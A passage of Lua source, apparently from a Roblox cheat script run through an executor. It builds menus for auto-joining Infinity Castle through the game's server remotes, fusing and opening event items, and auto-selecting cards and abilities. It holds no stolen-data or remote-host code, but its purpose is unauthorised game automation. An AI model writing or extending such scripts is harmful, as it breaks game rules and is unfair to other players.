Sections.PortalsRight:Divider()

Sections.PortalsLeft:Header({ Text = "🎯 Challenge Priority" })
Sections.PortalsLeft:SubLabel({ Text = "Assign priority (1-7) to each challenge. 1 = highest priority, 0 = ignore" })

createInput(
    Sections.PortalsLeft,
    "Tower Limit",
    "PortalPriority_TowerLimit",
    "1-7 or 0 to ignore",
    "Numeric",
    function(value)
        local num = tonumber(value) or 0
        getgenv().PortalConfig.priorities["Tower Limit"] = num
        getgenv().Config.portals.priorities["Tower Limit"] = num
        saveConfig(getgenv().Config)
    end,
    tostring(getgenv().PortalConfig.priorities["Tower Limit"])
)

createInput(
    Sections.PortalsLeft,
    "Immunity",
    "PortalPriority_Immunity",
    "1-7 or 0 to ignore",
    "Numeric",
    function(value)
        local num = tonumber(value) or 0
        getgenv().PortalConfig.priorities["Immunity"] = num
        getgenv().Config.portals.priorities["Immunity"] = num
        saveConfig(getgenv().Config)
    end,
    tostring(getgenv().PortalConfig.priorities["Immunity"])
)

createInput(
    Sections.PortalsLeft,
    "Speedy",
    "PortalPriority_Speedy",
    "1-7 or 0 to ignore",
    "Numeric",
    function(value)
        local num = tonumber(value) or 0
        getgenv().PortalConfig.priorities["Speedy"] = num
        getgenv().Config.portals.priorities["Speedy"] = num
        saveConfig(getgenv().Config)
    end,
    tostring(getgenv().PortalConfig.priorities["Speedy"])
)

createInput(
    Sections.PortalsLeft,
    "No Hit",
    "PortalPriority_NoHit",
    "1-7 or 0 to ignore",
    "Numeric",
    function(value)
        local num = tonumber(value) or 0
        getgenv().PortalConfig.priorities["No Hit"] = num
        getgenv().Config.portals.priorities["No Hit"] = num
        saveConfig(getgenv().Config)
    end,
    tostring(getgenv().PortalConfig.priorities["No Hit"])
)

createInput(
    Sections.PortalsLeft,
    "Flight",
    "PortalPriority_Flight",
    "1-7 or 0 to ignore",
    "Numeric",
    function(value)
        local num = tonumber(value) or 0
        getgenv().PortalConfig.priorities["Flight"] = num
        getgenv().Config.portals.priorities["Flight"] = num
        saveConfig(getgenv().Config)
    end,
    tostring(getgenv().PortalConfig.priorities["Flight"])
)

createInput(
    Sections.PortalsLeft,
    "Short Range",
    "PortalPriority_ShortRange",
    "1-7 or 0 to ignore",
    "Numeric",
    function(value)
        local num = tonumber(value) or 0
        getgenv().PortalConfig.priorities["Short Range"] = num
        getgenv().Config.portals.priorities["Short Range"] = num
        saveConfig(getgenv().Config)
    end,
    tostring(getgenv().PortalConfig.priorities["Short Range"])
)

createInput(
    Sections.PortalsLeft,
    "High Cost",
    "PortalPriority_HighCost",
    "1-7 or 0 to ignore",
    "Numeric",
    function(value)
        local num = tonumber(value) or 0
        getgenv().PortalConfig.priorities["High Cost"] = num
        getgenv().Config.portals.priorities["High Cost"] = num
        saveConfig(getgenv().Config)
    end,
    tostring(getgenv().PortalConfig.priorities["High Cost"])
)


do
Sections.InfinityCastleLeft:Header({ Text = "🏯 Auto Join Infinity Castle" })
Sections.InfinityCastleLeft:SubLabel({ Text = "Automatically join Infinity Castle with your preferred difficulty" })

if not getgenv().InfinityCastleAutoJoinEnabled then
    getgenv().InfinityCastleAutoJoinEnabled = getgenv().Config.toggles.InfinityCastleAutoJoinToggle or false
end

if not getgenv().InfinityCastleDifficulty then
    getgenv().InfinityCastleDifficulty = getgenv().Config.inputs.InfinityCastleDifficulty or "Easy"
end

createToggle(
    Sections.InfinityCastleLeft,
    "Auto Join Infinity Castle",
    "InfinityCastleAutoJoinToggle",
    function(value)
        getgenv().InfinityCastleAutoJoinEnabled = value
        Window:Notify({
            Title = "Infinity Castle",
            Description = value and "Auto Join Enabled" or "Auto Join Disabled",
            Lifetime = 3
        })
    end,
    getgenv().InfinityCastleAutoJoinEnabled
)

createDropdown(
    Sections.InfinityCastleLeft,
    "Difficulty",
    "InfinityCastleDifficulty",
    {"Easy", "Hard"},
    false,
    function(value)
        getgenv().InfinityCastleDifficulty = value
        Window:Notify({
            Title = "Infinity Castle",
            Description = "Difficulty set to: " .. value,
            Lifetime = 3
        })
    end,
    getgenv().InfinityCastleDifficulty
)

Sections.InfinityCastleLeft:SubLabel({
    Text = "Select difficulty and enable auto join to automatically enter Infinity Castle"
})

task.spawn(function()
    local pollingInterval = MobileOptimizer:getPollingInterval(2)
    
    while true do
        task.wait(pollingInterval)
        
        if getgenv().InfinityCastleAutoJoinEnabled then
            ErrorHandler:wrapAsync(function()
                local remotes = RS:FindFirstChild("Remotes")
                local infinityCastleRemotes = remotes and remotes:FindFirstChild("InfinityCastle")
                local enterEvent = infinityCastleRemotes and infinityCastleRemotes:FindFirstChild("Enter")
                
                if enterEvent then
                    if getgenv().WaitForPlayerEnabled then
                        local entryUI = nil
                        for _, gui in ipairs(LocalPlayer.PlayerGui:GetChildren()) do
                            if gui.Name:find("Entry") then
                                entryUI = gui
                                break
                            end
                        end
                        
                        if entryUI then
                            local function findTextLabel(parent)
                                for _, child in ipairs(parent:GetDescendants()) do
                                    if child:IsA("TextLabel") and child.Text:find("Players") then
                                        return child
                                    end
                                end
                                return nil
                            end
                            
                            local textLabel = findTextLabel(entryUI)
                            if textLabel then
                                local waitStartTime = tick()
                                local maxWaitTime = 300
                                
                                while tick() - waitStartTime < maxWaitTime do
                                    local text = textLabel.Text
                                    local current, max = text:match("%((%d+)/(%d+)%)")
                                    
                                    if current and max then
                                        local currentPlayers = tonumber(current)
                                        local targetCount = getgenv().WaitForPlayerCount or 1
                                        
                                        if currentPlayers >= targetCount then
                                            print("[Infinity Castle] ✅ " .. currentPlayers .. "/" .. targetCount .. " players ready, joining...")
                                            break
                                        else
                                            print("[Infinity Castle] ⏳ Waiting for players... " .. currentPlayers .. "/" .. targetCount)
                                        end
                                    end
                                    
                                    task.wait(1)
                                end
                            end
                        end
                    end
                    
                    local isHardMode = getgenv().InfinityCastleDifficulty == "Hard"
                    enterEvent:FireServer(isHardMode)
                    
                    Window:Notify({
                        Title = "Infinity Castle",
                        Description = "Joining " .. getgenv().InfinityCastleDifficulty .. " mode...",
                        Lifetime = 3
                    })
                    
                    task.wait(5)
                end
            end)
        end
    end
end)
end

-- Event tab 1 UI code removed - code saved in Event1_Event2_Backup.lua

do
Sections.Event3Left:Header({ Text = "🍬 Event 3 Auto Fuse" })
Sections.Event3Left:SubLabel({ Text = "Automatically fuse Halloween candy items" })

createToggle(
    Sections.Event3Left,
    "Auto Fuse Rainbow Candy",
    "AutoFuseRainbowCandyToggle",
    function(value)
        getgenv().AutoFuseRainbowCandyEnabled = value
        Window:Notify({
            Title = "Auto Fuse Rainbow Candy",
            Description = value and "Enabled - Fusing 5 → 1 Candy Bag" or "Disabled",
            Lifetime = 3
        })
    end,
    getgenv().AutoFuseRainbowCandyEnabled
)

createToggle(
    Sections.Event3Left,
    "Auto Fuse Candy Bag",
    "AutoFuseCandyBagToggle",
    function(value)
        getgenv().AutoFuseCandyBagEnabled = value
        Window:Notify({
            Title = "Auto Fuse Candy Bag",
            Description = value and "Enabled - Fusing 15 → 1 Big Candy Bag" or "Disabled",
            Lifetime = 3
        })
    end,
    getgenv().AutoFuseCandyBagEnabled
)

createToggle(
    Sections.Event3Left,
    "Auto Fuse Big Candy Bag",
    "AutoFuseBigCandyBagToggle",
    function(value)
        getgenv().AutoFuseBigCandyBagEnabled = value
        Window:Notify({
            Title = "Auto Fuse Big Candy Bag",
            Description = value and "Enabled" or "Disabled",
            Lifetime = 3
        })
    end,
    getgenv().AutoFuseBigCandyBagEnabled
)

Sections.Event3Left:Divider()

Sections.Event3Left:Header({ Text = "🎁 Event 3 Auto Open" })
Sections.Event3Left:SubLabel({ Text = "Automatically open candy bags" })

createToggle(
    Sections.Event3Left,
    "Auto Open Candy Bag",
    "AutoOpenCandyBagToggle",
    function(value)
        getgenv().AutoOpenCandyBagEnabled = value
        Window:Notify({
            Title = "Auto Open Candy Bag",
            Description = value and "Enabled" or "Disabled",
            Lifetime = 3
        })
    end,
    getgenv().AutoOpenCandyBagEnabled
)

createToggle(
    Sections.Event3Left,
    "Auto Open Big Candy Bag",
    "AutoOpenBigCandyBagToggle",
    function(value)
        getgenv().AutoOpenBigCandyBagEnabled = value
        Window:Notify({
            Title = "Auto Open Big Candy Bag",
            Description = value and "Enabled" or "Disabled",
            Lifetime = 3
        })
    end,
    getgenv().AutoOpenBigCandyBagEnabled
)

end

do
Sections.SlimeRushLeft:Header({ Text = "🟢 Slime Rush Settings" })
Sections.SlimeRushLeft:SubLabel({ Text = "Automatic card selection for Slime Rush" })

createToggle(
    Sections.SlimeRushLeft,
    "Enable Slime Rush",
    "SlimeRushToggle",
    function(value)
        getgenv().SlimeRushEnabled = value
        Window:Notify({
            Title = "Slime Rush",
            Description = value and "Enabled" or "Disabled",
            Lifetime = 3
        })
    end,
    getgenv().Config.toggles.SlimeRushToggle or false
)

Sections.SlimeRushLeft:Divider()

Sections.SlimeRushLeft:Header({ Text = "💡 How It Works" })
Sections.SlimeRushLeft:SubLabel({ 
    Text = "The script automatically selects cards by priority (1-999). Cards set to 999 are skipped. Adjust priorities on the right." 
})

Sections.SlimeRushLeft:Divider()

Sections.SlimeRushLeft:Header({ Text = "⚙️ Card Selection Mode" })
Sections.SlimeRushLeft:SubLabel({ Text = "Choose between fast or reliable selection" })

local slimeFastModeToggle, slimeSlowerModeToggle, slimeSmartModeToggle

slimeFastModeToggle = createToggle(
    Sections.SlimeRushLeft,
    "⚡ Fast Mode",
    "SlimeRushCardToggle",
    function(value)
        getgenv().SlimeRushCardSelectionEnabled = value
        if value then
            if slimeSlowerModeToggle then
                getgenv().SlimeRushSlowerCardSelectionEnabled = false
                getgenv().Config.toggles.SlimeRushSlowerCardToggle = false
                pcall(function() slimeSlowerModeToggle:UpdateState(false) end)
            end
            if slimeSmartModeToggle then
                getgenv().SlimeRushSmartCardSelectionEnabled = false
                getgenv().Config.toggles.SlimeRushSmartCardToggle = false
                pcall(function() slimeSmartModeToggle:UpdateState(false) end)
            end
        end
        Window:Notify({
            Title = "Slime Rush Fast Mode",
            Description = value and "Enabled" or "Disabled",
            Lifetime = 3
        })
    end,
    getgenv().SlimeRushCardSelectionEnabled
)

slimeSlowerModeToggle = createToggle(
    Sections.SlimeRushLeft,
    "🐌 Slower Mode (More Reliable)",
    "SlimeRushSlowerCardToggle",
    function(value)
        getgenv().SlimeRushSlowerCardSelectionEnabled = value
        if value then
            if slimeFastModeToggle then
                getgenv().SlimeRushCardSelectionEnabled = false
                getgenv().Config.toggles.SlimeRushCardToggle = false
                pcall(function() slimeFastModeToggle:UpdateState(false) end)
            end
            if slimeSmartModeToggle then
                getgenv().SlimeRushSmartCardSelectionEnabled = false
                getgenv().Config.toggles.SlimeRushSmartCardToggle = false
                pcall(function() slimeSmartModeToggle:UpdateState(false) end)
            end
        end
        Window:Notify({
            Title = "Slime Rush Slower Mode",
            Description = value and "Enabled" or "Disabled",
            Lifetime = 3
        })
    end,
    getgenv().SlimeRushSlowerCardSelectionEnabled
)

slimeSmartModeToggle = createToggle(
    Sections.SlimeRushLeft,
    "🧠 Smart Mode (Maximize Coins)",
    "SlimeRushSmartCardToggle",
    function(value)
        getgenv().SlimeRushSmartCardSelectionEnabled = value
        if value then
            if slimeFastModeToggle then
                getgenv().SlimeRushCardSelectionEnabled = false
                getgenv().Config.toggles.SlimeRushCardToggle = false
                pcall(function() slimeFastModeToggle:UpdateState(false) end)
            end
            if slimeSlowerModeToggle then
                getgenv().SlimeRushSlowerCardSelectionEnabled = false
                getgenv().Config.toggles.SlimeRushSlowerCardToggle = false
                pcall(function() slimeSlowerModeToggle:UpdateState(false) end)
            end
        end
        Window:Notify({
            Title = "Slime Rush Smart Mode",
            Description = value and "Enabled" or "Disabled",
            Lifetime = 3
        })
    end,
    getgenv().SlimeRushSmartCardSelectionEnabled
)

Sections.SlimeRushRight:Header({ Text = "📊 Card Priorities" })
Sections.SlimeRushRight:SubLabel({ 
    Text = "Lower number = higher priority (1 is best, 999 to skip)"
})

Sections.SlimeRushRight:Divider()
Sections.SlimeRushRight:Header({ Text = "✨ Buff Cards" })
createCardPriorityInputs(Sections.SlimeRushRight, getgenv().SlimeRushBuffCards, getgenv().SlimeRushCardPriority, "SlimeRush_")

Sections.SlimeRushRight:Divider()
Sections.SlimeRushRight:Header({ Text = "⚠️ Debuff Cards (Give Coins)" })
createCardPriorityInputs(Sections.SlimeRushRight, getgenv().SlimeRushDebuffCards, getgenv().SlimeRushCardPriority, "SlimeRush_")

Sections.SlimeRushRight:Divider()
Sections.SlimeRushRight:Header({ Text = "💀 Sacrifice (Skip Recommended)" })
createCardPriorityInputs(Sections.SlimeRushRight, getgenv().SlimeRushSacrifice, getgenv().SlimeRushCardPriority, "SlimeRush_")


end

do
Sections.BossRushLeft:Header({ Text = "⚔️ Boss Rush Settings" })
Sections.BossRushLeft:SubLabel({ Text = "Automatic card selection for Boss Rush" })

createToggle(
    Sections.BossRushLeft,
    "Enable Boss Rush",
    "BossRushToggle",
    function(value)
        getgenv().BossRushEnabled = value
        getgenv().Config.toggles.BossRushToggle = value
        saveConfig(getgenv().Config)
        Window:Notify({
            Title = "Boss Rush",
            Description = value and "Enabled" or "Disabled",
            Lifetime = 3
        })
    end,
    getgenv().BossRushEnabled
)

Sections.BossRushLeft:Divider()

Sections.BossRushLeft:Header({ Text = "💡 How It Works" })
Sections.BossRushLeft:SubLabel({ 
    Text = "The script automatically selects cards by priority (1-999). Cards set to 999 are skipped. Adjust priorities on the right." 
})

Sections.BossRushLeft:SubLabel({ 
    Text = "Lower number = higher priority • Set to 999 to avoid" 
})


Sections.BossRushRight:Header({ Text = "🃏 Card Priorities" })
Sections.BossRushRight:SubLabel({ Text = "Set priority for each card (1 = highest, 999 = skip)" })
Sections.BossRushRight:Divider()

Sections.BossRushRight:Header({ Text = "🎯 General Cards" })

createCardPriorityInputs(Sections.BossRushRight, getgenv().BossRushGeneral, getgenv().BossRushCardPriority, "BossRush_")

Sections.BossRushRight:Divider()

Sections.BossRushRight:Header({ Text = "🏰 Babylonia Castle Cards" })

pcall(function()
    local babyloniaModule = RS:FindFirstChild("Modules"):FindFirstChild("CardHandler"):FindFirstChild("BossRushCards"):FindFirstChild("Babylonia Castle")
    if babyloniaModule then
        local cards = require(babyloniaModule)
        for _, card in pairs(cards) do
            local cardName = card.CardName
            local cardType = card.CardType or "Buff"
            local inputKey = "BabyloniaCastle_" .. cardName
            
            if not getgenv().BossRushCardPriority then 
                getgenv().BossRushCardPriority = {} 
            end
            if not getgenv().BossRushCardPriority[cardName] then 
                getgenv().BossRushCardPriority[cardName] = 999 
            end
            
            local defaultValue = getgenv().Config.inputs[inputKey] or "999"
            
            createInput(
                Sections.BossRushRight,
                cardName .. " (" .. cardType .. ")",
                inputKey,
                "Priority (1-999)",
                "Numeric",
                function(value)
                    local num = tonumber(value)
                    if num then
                        getgenv().BossRushCardPriority[cardName] = num
                    end
                end,
                defaultValue
            )
            
            getgenv().BossRushCardPriority[cardName] = tonumber(defaultValue) or 999
        end
    end
end)



local UnitNames = nil
pcall(function()
    local unitNamesModule = RS:FindFirstChild("Modules") and RS.Modules:FindFirstChild("UnitNames")
    if unitNamesModule and unitNamesModule:IsA("ModuleScript") then
        UnitNames = require(unitNamesModule)
    end
end)

local function getUnitDisplayName(unitName)
    if UnitNames and UnitNames[unitName] then
        return UnitNames[unitName]
    end
    return unitName
end

local function getUnitFileName(displayName)
    if UnitNames then
        for fileName, displayNameInModule in pairs(UnitNames) do
            if displayNameInModule == displayName then
                return fileName
            end
        end
    end
    return displayName
end


getgenv().BulmaEnabled = getgenv().Config.toggles.BulmaToggle or false
getgenv().BulmaWishType = getgenv().Config.dropdowns.BulmaWishType or "Power"
getgenv().BulmaWishUsedThisRound = false

getgenv().WukongEnabled = getgenv().Config.toggles.WukongToggle or false
getgenv().WukongTrackedClones = {}

getgenv().SkeletonKnightEnabled = getgenv().Config.toggles.SkeletonKnightToggle or false
getgenv().SkeletonKnightTargetUnit = getgenv().Config.dropdowns.SkeletonKnightTargetUnit or ""
getgenv().SkeletonKnightLastUse = 0

getgenv().AlucardHypnosisEnabled = getgenv().Config.toggles.AlucardHypnosisToggle or false
getgenv().AlucardHypnosisTargetUnit = getgenv().Config.dropdowns.AlucardHypnosisTargetUnit or ""
getgenv().AlucardHypnosisLastUse = 0

getgenv().OneEyeDevilEnabled = getgenv().Config.toggles.OneEyeDevilToggle or false
getgenv().OneEyeDevilCurrentIndex = 0 

getgenv().EventJoinDelay = tonumber(getgenv().Config.inputs.EventJoinDelay) or 0
getgenv().AutoJoinDelay = tonumber(getgenv().Config.inputs.AutoJoinDelay) or 0

getgenv().FinalExpAutoJoinEasyEnabled = getgenv().Config.toggles.FinalExpAutoJoinEasyToggle or false
getgenv().FinalExpAutoJoinHardEnabled = getgenv().Config.toggles.FinalExpAutoJoinHardToggle or false
getgenv().FinalExpAutoSkipShopEnabled = getgenv().Config.toggles.FinalExpAutoSkipShopToggle or false
getgenv().FinalExpAutoSelectModeEnabled = getgenv().Config.toggles.FinalExpAutoSelectModeToggle or false
getgenv().FinalExpSkipRewardsEnabled = getgenv().Config.toggles.FinalExpSkipRewardsToggle or false

getgenv().FinalExpRestPriority = tonumber(getgenv().Config.inputs.FinalExpRestPriority) or 3
getgenv().FinalExpDungeonPriority = tonumber(getgenv().Config.inputs.FinalExpDungeonPriority) or 1
getgenv().FinalExpDoubleDungeonPriority = tonumber(getgenv().Config.inputs.FinalExpDoubleDungeonPriority) or 2
getgenv().FinalExpShopPriority = tonumber(getgenv().Config.inputs.FinalExpShopPriority) or 4

local BLACKLISTED_UNITS = {
    "NarutoBaryonClone"
}

local function isBlacklisted(unitName)
    for _, blacklisted in ipairs(BLACKLISTED_UNITS) do
        if unitName == blacklisted or unitName:find(blacklisted) then
            return true
        end
    end
    return false
end

if not getgenv()._AbilityUIElements then
    getgenv()._AbilityUIElements = {Left = {}, Right = {}}
end

local function clearAbilityUI()
    if not getgenv()._AbilityUIElements then
        getgenv()._AbilityUIElements = {Left = {}, Right = {}}
        return
    end
    
    for side, elements in pairs(getgenv()._AbilityUIElements) do
        if elements then
            for _, element in ipairs(elements) do
                pcall(function()
                    if element and element.Remove then
                        element:Remove()
                    elseif element and element.SetVisibility then
                        element:SetVisibility(false)
                    end
                end)
            end
        end
    end
    getgenv()._AbilityUIElements = {Left = {}, Right = {}}
end


local function buildAutoAbilityUI()
    if getgenv()._AbilityUIBuilding then return end
    if getgenv()._AbilityUIBuilt then return end
    getgenv()._AbilityUIBuilding = true
    
    clearAbilityUI()
    
    local clientData = getClientData()
    if not clientData or not clientData.Slots then
        Window:Notify({
            Title = "Auto Ability",
            Description = "ClientData not available yet, retrying...",
            Lifetime = 3
        })
        getgenv()._AbilityUIBuilt = false
        getgenv()._AbilityUIBuilding = false
        return
    end
    
    local anyBuilt = false
    local success, err = pcall(function()
        if not Tabs or not Tabs.Abilities then
            warn("[Ability UI] Tabs.Abilities not found!")
            return
        end
        local unitsToShow = {}
        
        local sortedSlots = {"Slot1", "Slot2", "Slot3", "Slot4", "Slot5", "Slot6"}
        for slotIndex, slotName in ipairs(sortedSlots) do
            local slotData = clientData.Slots[slotName]
            if slotData and slotData.Value then
                local unitNameToUse = slotData.Value
                local isEZA = false
                                
                if slotData.UnitID then
                    if clientData.UnitData and clientData.UnitData[slotData.UnitID] then
                        local unitData = clientData.UnitData[slotData.UnitID]
                        if unitData.EZA == true then
                            isEZA = true
                            unitNameToUse = slotData.Value .. "EZA"
                        end
                    elseif clientData[slotData.UnitID] then
                        local unitData = clientData[slotData.UnitID]
                        if unitData.EZA == true then
                            isEZA = true
                            unitNameToUse = slotData.Value .. "EZA"
                        end
                    end
                end
                
                if isEZA then
                    getgenv().EZAUnitMapping[unitNameToUse] = slotData.Value
                end
                
                table.insert(unitsToShow, {
                    name = unitNameToUse,
                    originalName = slotData.Value,
                    slot = slotName,
                    level = slotData.Level or 0,
                    slotIndex = slotIndex,
                    isSpawned = false,
                    isEZA = isEZA
                })
            end
        end
        
        for _, unitInfo in ipairs(unitsToShow) do
            local unitName = unitInfo.name
            
            if isBlacklisted(unitName) then
                continue
            end
            
            if unitName == "Bulma" then
                continue
            end
            
            if unitName == "EtoEvo" then
                continue
            end
            
            if unitInfo.originalName == "Skull_Knight_Evo" and unitInfo.isEZA then
                continue
            end
            
            local abilities = getAllAbilities(unitName)
            
            if next(abilities) then
                local tabSide = "Right"
                local sideKey = tabSide
                
                local displayName = getUnitDisplayName(unitInfo.originalName or unitName)
                if unitInfo.isEZA then
                    displayName = displayName .. " ⚡"
                end
                
                local unitSection = Tabs.Abilities:Section({ Side = tabSide })
                table.insert(getgenv()._AbilityUIElements[sideKey], unitSection)
                
                local headerText = "📦 " .. displayName
                local sublabelText = unitInfo.slot .. " • Level " .. tostring(unitInfo.level)
                if unitInfo.isEZA then
                    sublabelText = sublabelText .. " • EZA"
                end
                
                unitSection:Header({ Text = headerText })
                unitSection:SubLabel({ Text = sublabelText })
                unitSection:Divider()
                
                anyBuilt = true
                
                local targetSection = unitSection
                
                if not getgenv().UnitAbilities then getgenv().UnitAbilities = {} end
                if not getgenv().UnitAbilities[unitName] then getgenv().UnitAbilities[unitName] = {} end
                if not getgenv().Config.abilities then getgenv().Config.abilities = {} end
                if not getgenv().Config.abilities[unitName] then getgenv().Config.abilities[unitName] = {} end
                    
                    local sortedAbilities = {}
                    for abilityName, data in pairs(abilities) do
                        table.insert(sortedAbilities, { name = abilityName, data = data })
                    end
                    table.sort(sortedAbilities, function(a, b)
                        local aLevel = (a.data and a.data.requiredLevel) or 0
                        local bLevel = (b.data and b.data.requiredLevel) or 0
                        return aLevel < bLevel
                    end)
                    
                    for _, ab in ipairs(sortedAbilities) do
                        local abilityName = ab.name
                        local abilityData = ab.data
                        
                        if unitName == "JinMoriGodly" and abilityName == "Clone Synthesis" then
                            continue
                        end
                        
                        local saved = getgenv().Config.abilities and 
                                     getgenv().Config.abilities[unitName] and 
                                     getgenv().Config.abilities[unitName][abilityName]
                        
                        local waveInputFlag = unitName .. "_" .. abilityName .. "_Wave"
                        local savedWave = getgenv().Config.inputs[waveInputFlag]
                        if savedWave and savedWave ~= "" then
                            savedWave = tonumber(savedWave)
                        else
                            savedWave = nil
                        end
                        
                        if not getgenv().UnitAbilities[unitName][abilityName] then
                            getgenv().UnitAbilities[unitName][abilityName] = {
                                enabled = (saved and saved.enabled) or false,
                                onlyOnBoss = (saved and saved.onlyOnBoss) or false,
                                specificWave = savedWave or (saved and saved.specificWave) or nil,
                                requireBossInRange = (saved and saved.requireBossInRange) or false,
                                useOnWave = (saved and saved.useOnWave) or false
                            }
                        end
                        
                        local cfg = getgenv().UnitAbilities[unitName][abilityName]
                        local defaultToggle = cfg.enabled
                        
                        local abilityIcon = abilityData.isAttribute and "🔒" or "⚡"
                        local abilityInfo = abilityIcon .. " " .. abilityName .. " (CD: " .. tostring(abilityData.cooldown) .. "s)"
                        
                        createToggle(
                            targetSection,
                            abilityInfo,
                            unitName .. "_" .. abilityName .. "_Toggle",
                            function(v)
                                cfg.enabled = v
                                getgenv().Config.abilities[unitName] = getgenv().Config.abilities[unitName] or {}
                                getgenv().Config.abilities[unitName][abilityName] = getgenv().Config.abilities[unitName][abilityName] or {}
                                getgenv().Config.abilities[unitName][abilityName].enabled = v
                                getgenv().SaveConfig(getgenv().Config)
                                
                                Window:Notify({
                                    Title = "Auto Ability",
                                    Description = abilityName .. " " .. (v and "Enabled" or "Disabled"),
                                    Lifetime = 2
                                })
                            end,
                            defaultToggle
                        )
                        
                        local modifierKey = unitName .. "_" .. abilityName .. "_Modifiers"
                        
                        local savedDropdown = getgenv().Config.dropdowns[modifierKey]
                        local defaultValue
                        
                        if savedDropdown and type(savedDropdown) == "table" then
                            defaultValue = {}
                            for optionName, isSelected in pairs(savedDropdown) do
                                if isSelected == true then
                                    table.insert(defaultValue, optionName)
                                end
                            end
                        else
                            defaultValue = {}
                            if cfg.onlyOnBoss then table.insert(defaultValue, "Only On Boss") end
                            if cfg.requireBossInRange then table.insert(defaultValue, "Boss In Range") end
                            if cfg.useOnWave then table.insert(defaultValue, "On Wave") end
                        end
                        
                        createDropdown(
                            targetSection,
                            "  > Conditions",
                            modifierKey,
                            {"Only On Boss", "Boss In Range", "On Wave"},
                            true,
                            function(Value)
                                local selectedSet = {}
                                if type(Value) == "table" then
                                    for k, v in pairs(Value) do
                                        if v == true then
                                            selectedSet[k] = true
                                        end
                                    end
                                end
                                
                                cfg.onlyOnBoss = selectedSet["Only On Boss"] == true
                                cfg.requireBossInRange = selectedSet["Boss In Range"] == true
                                cfg.useOnWave = selectedSet["On Wave"] == true
                                
                                getgenv().Config.abilities[unitName] = getgenv().Config.abilities[unitName] or {}
                                local store = getgenv().Config.abilities[unitName]
                                store[abilityName] = store[abilityName] or {}
                                store[abilityName].onlyOnBoss = cfg.onlyOnBoss
                                store[abilityName].requireBossInRange = cfg.requireBossInRange
                                store[abilityName].useOnWave = cfg.useOnWave
                                
                                getgenv().SaveConfig(getgenv().Config)
                            end,
                            defaultValue
                        )
                        
                        local waveFlag = unitName .. "_" .. abilityName .. "_Wave"
                        local waveDefault = ""
                        if cfg.specificWave then
                            waveDefault = tostring(cfg.specificWave)
                        elseif getgenv().Config.inputs[waveFlag] and getgenv().Config.inputs[waveFlag] ~= "" then
                            waveDefault = tostring(getgenv().Config.inputs[waveFlag])
                        end
                        
                        createInput(
                            targetSection,
                            "  > Wave Number",
                            waveFlag,
                            "Required if 'On Wave' selected",
                            "Numeric",
                            function(text)
                                local num = tonumber(text)
                                cfg.specificWave = num
                                getgenv().Config.abilities[unitName] = getgenv().Config.abilities[unitName] or {}
                                getgenv().Config.abilities[unitName][abilityName] = getgenv().Config.abilities[unitName][abilityName] or {}
                                getgenv().Config.abilities[unitName][abilityName].specificWave = num
                                getgenv().SaveConfig(getgenv().Config)
                            end,
                            waveDefault
                        )
                    end
                    
                    if unitName == "EscanorGodly" then
                        local success, err = pcall(function()
                            local clientData = getClientData()
                            
                            if clientData and clientData.UnitData and clientData.Slots then
                                local escanorUnitID = nil
                                for slotName, slotData in pairs(clientData.Slots) do
                                    if slotData.Value == "EscanorGodly" and slotData.UnitID then
                                        escanorUnitID = slotData.UnitID
                                        break
                                    end
                                end
                                
                                if escanorUnitID and clientData.UnitData[escanorUnitID] then
                                    local unitData = clientData.UnitData[escanorUnitID]
                                    
                                    if unitData.EquippedSoul == "SoulOfTheScarredSun" then
                                        local soulAbilityName = "Who Decided That?"
                                        
                                        if not getgenv().UnitAbilities[unitName][soulAbilityName] then
                                            local saved = getgenv().Config.abilities and 
                                                         getgenv().Config.abilities[unitName] and 
                                                         getgenv().Config.abilities[unitName][soulAbilityName]
                                            
                                            local waveInputFlag = unitName .. "_" .. soulAbilityName .. "_Wave"
                                            local savedWave = getgenv().Config.inputs[waveInputFlag]
                                            if savedWave and savedWave ~= "" then
                                                savedWave = tonumber(savedWave)
                                            else
                                                savedWave = nil
                                            end
                                            
                                            getgenv().UnitAbilities[unitName][soulAbilityName] = {
                                                enabled = (saved and saved.enabled) or false,
                                                onlyOnBoss = (saved and saved.onlyOnBoss) or false,
                                                specificWave = savedWave or (saved and saved.specificWave) or nil,
                                                requireBossInRange = (saved and saved.requireBossInRange) or false,
                                                useOnWave = (saved and saved.useOnWave) or false
                                            }
                                        end
                                        
                                        local cfg = getgenv().UnitAbilities[unitName][soulAbilityName]
                                        
                                        targetSection:Divider()
                                        targetSection:SubLabel({ Text = "🔥 Soul Ability (SoulOfTheScarredSun)" })
                                        
                                        createToggle(
                                            targetSection,
                                            "⚡ Who Decided That? (CD: 999999s)",
                                            unitName .. "_" .. soulAbilityName .. "_Toggle",
                                            function(v)
                                                cfg.enabled = v
                                                getgenv().Config.abilities[unitName] = getgenv().Config.abilities[unitName] or {}
                                                getgenv().Config.abilities[unitName][soulAbilityName] = getgenv().Config.abilities[unitName][soulAbilityName] or {}
                                                getgenv().Config.abilities[unitName][soulAbilityName].enabled = v
                                                getgenv().SaveConfig(getgenv().Config)
                                                
                                                Window:Notify({
                                                    Title = "Auto Ability",
                                                    Description = soulAbilityName .. " " .. (v and "Enabled" or "Disabled"),
                                                    Lifetime = 2
                                                })
                                            end,
                                            cfg.enabled
                                        )
                                        
                                        local modifierKey = unitName .. "_" .. soulAbilityName .. "_Modifiers"
                                        local savedDropdown = getgenv().Config.dropdowns[modifierKey]
                                        local defaultValue
                                        
                                        if savedDropdown and type(savedDropdown) == "table" then
                                            defaultValue = {}
                                            for optionName, isSelected in pairs(savedDropdown) do
                                                if isSelected == true then
                                                    table.insert(defaultValue, optionName)
                                                end
                                            end
                                        else
                                            defaultValue = {}
                                            if cfg.onlyOnBoss then table.insert(defaultValue, "Only On Boss") end
                                            if cfg.requireBossInRange then table.insert(defaultValue, "Boss In Range") end
                                            if cfg.useOnWave then table.insert(defaultValue, "On Wave") end
                                        end
                                        
                                        createDropdown(
                                            targetSection,
                                            "  > Conditions",
                                            modifierKey,
                                            {"Only On Boss", "Boss In Range", "On Wave"},
                                            true,
                                            function(Value)
                                                local selectedSet = {}
                                                if type(Value) == "table" then
                                                    for k, v in pairs(Value) do
                                                        if v == true then
                                                            selectedSet[k] = true
                                                        end
                                                    end
                                                end
                                                
                                                cfg.onlyOnBoss = selectedSet["Only On Boss"] == true
                                                cfg.requireBossInRange = selectedSet["Boss In Range"] == true
                                                cfg.useOnWave = selectedSet["On Wave"] == true
                                                
                                                getgenv().Config.abilities[unitName] = getgenv().Config.abilities[unitName] or {}
                                                local store = getgenv().Config.abilities[unitName]
                                                store[soulAbilityName] = store[soulAbilityName] or {}
                                                store[soulAbilityName].onlyOnBoss = cfg.onlyOnBoss
                                                store[soulAbilityName].requireBossInRange = cfg.requireBossInRange
